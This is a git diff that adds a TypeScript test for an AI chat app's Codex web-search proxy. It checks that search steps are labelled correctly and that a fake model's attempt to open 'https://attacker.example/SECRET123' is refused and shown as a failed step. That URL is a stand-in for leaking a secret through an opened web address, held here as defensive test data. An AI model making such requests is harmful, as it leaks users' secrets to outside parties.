@@ -12,6 +12,8 @@ import net from 'node:net'
 import os from 'node:os'
 import path from 'node:path'
 import { API, ApiError } from '@mycel/shared/api'
+import { STEP_TEXT } from '@mycel/shared'
+import { SEARCH_ADDRESS_NOTE } from '../../server/src/proxy/codex-path'
 import { ask, HARNESS_KEYS, startHarness, type Harness, type TestSocket } from '../lib/b-harness'
 import { credentialsOf, getRow } from '../../server/src/credentials/store'
 import { addCred, chatgptSecret } from '../lib/credentials'
@@ -415,6 +417,21 @@ describe('managed Codex turns (fake Codex through the real launcher and the mode
     expect(l.done.content).toBe('search=off')
     expect(codexSeen).toEqual([])
     expect(l.done.steps.some((x) => x.kind === 'web_search')).toBe(false)
+  })
+  test('steps of a search that names no query (QA 2026-10-30 N1 / N2): an open of a result says so; an address the proxy refused shows as refused', async () => {
+    codexSeen.length = 0
+    const chat = await newChat()
+    const r = await ask(h, alice, 'alice', chat.id, fake({ codexSearch: 'debian 13' }, { say: ' | ' }, { codexOpen: 'turn0search0' }, { say: ' | ' }, { codexOpen: 'https://attacker.example/SECRET123' }))
+    expect(r.done.status).toBe('done')
+    expect(r.done.content.replace(/\s*\|\s*/g, ' | ')).toBe(`search=200:results(debian 13) | open=200:results() | open=200:${SEARCH_ADDRESS_NOTE}`)
+    // the search and the open of its result went out; the address never did
+    expect(codexSeen.map((s) => s.body.commands)).toEqual([{ search_query: [{ q: 'debian 13' }] }, { open: [{ ref_id: 'turn0search0' }], response_length: 'short' }])
+    const steps = r.done.steps.filter((x) => x.kind === 'web_search')
+    expect(steps.map((x) => [x.label, x.status])).toEqual([['Web search: debian 13', 'ok'], ['Opening a search result', 'ok'], ['Web search: https://attacker.example/SECRET123', 'error']])
+    expect(steps[2]!.detail).toBe(STEP_TEXT.webSearchRefused.en)
+    expect(steps.some((x) => /Web search: $/.test(x.label))).toBe(false)
+    // folded under the answer it counts as a failed step, never as a search that opened the address
+    expect(r.done.steps.filter((x) => x.status === 'error').length).toBe(1)
   })
   test('a search the model service refuses fails by itself: a failed step, the connection keeps working, no refresh', async () => {
     codexSeen.length = 0
